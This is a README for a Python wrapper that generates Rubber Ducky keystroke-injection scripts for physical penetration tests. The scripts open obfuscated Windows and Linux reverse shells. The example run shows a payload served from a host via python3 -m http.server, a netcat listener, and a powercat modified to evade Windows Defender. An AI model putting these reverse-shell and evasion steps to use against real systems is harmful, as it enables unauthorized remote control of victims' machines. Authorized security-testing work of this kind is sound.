# duckyScripting
Just my rubber ducky scripts and some wrappers.

## help
```
$ python3 quack.py -h
usage: quack.py [-h] [-s] [-wr] [-lr] [-l LISTENER] [-pp PAYLOADPROVIDER]

Prepare rubber ducky scripts for physical engagments. Tool made by H4. Creds for powercat go to https://github.com/besimorhino/powercat

optional arguments:
  -h, --help            show this help message and exit
  -s, --setup           initial setup
  -wr, --windowsReverse
                        creating an obfuscated Windows reverse shell
  -lr, --linuxReverse   creating a Linux reverse shell (tested under Ubuntu 22.04.3)
  -l LISTENER, --listener LISTENER
                        IP and port of shell listener. Format: IP:PORT (needed for -wr option)
  -pp PAYLOADPROVIDER, --payloadProvider PAYLOADPROVIDER
                        server which provides the obfuscated powercat version. Format: IP:PORT (needed for -wr option)

example usage: python3 quack.py-wr -l 192.168.1.10:8001 -pp 192.168.1.10:80
```

## setup
Start by running in setup mode to download every needed resource.
```bash
$ python3 quack.py --setup
[#] 1. Downloading powercat (https://github.com/besimorhino/powercat) for Windows reverse shell payload...
```

## reverse shells
### Windows
- Using [Powercat](https://github.com/besimorhino/powercat)
- Modifying [Powercat](https://github.com/besimorhino/powercat) to bypass Windows Defender detection

Example
```
python3 quack.py -wr -l 192.168.1.10:8001 -pp 192.168.1.10:80

[#] Selected payload: Windows reverse shell

[#] 1. Are all parameters correct?
[#]	shell listener IP: 192.168.1.10
[#]	shell listener PORT: 8001
[#]	payload provider IP: 192.168.1.10
[#]	payload provider PORT: 80
[#] Y/N? Y

[#] 2. Obfuscating powercat...

[#] 3. Creating ducky script payload...
[+] Ducky script payload wrote to generated_scripts/tojszwdbxnsoidwl_windows_reverse_shell.txt

[#] Before you use the ducky script perform the following steps.
[#]	1. Start a web server on 192.168.1.10 to provide the obfuscated powercat script:
[#]		- Copy tojszwdb.ps1 to 192.168.1.10
[#]		- In the same folder as tojszwdb.ps1 start a web server: python3 -m http.server 80
[#]	2. Start the shell listener on 192.168.1.10:
[#]		- Start nc -lvp 8001

[+] Good bye! Have fun with the ducky script.
```
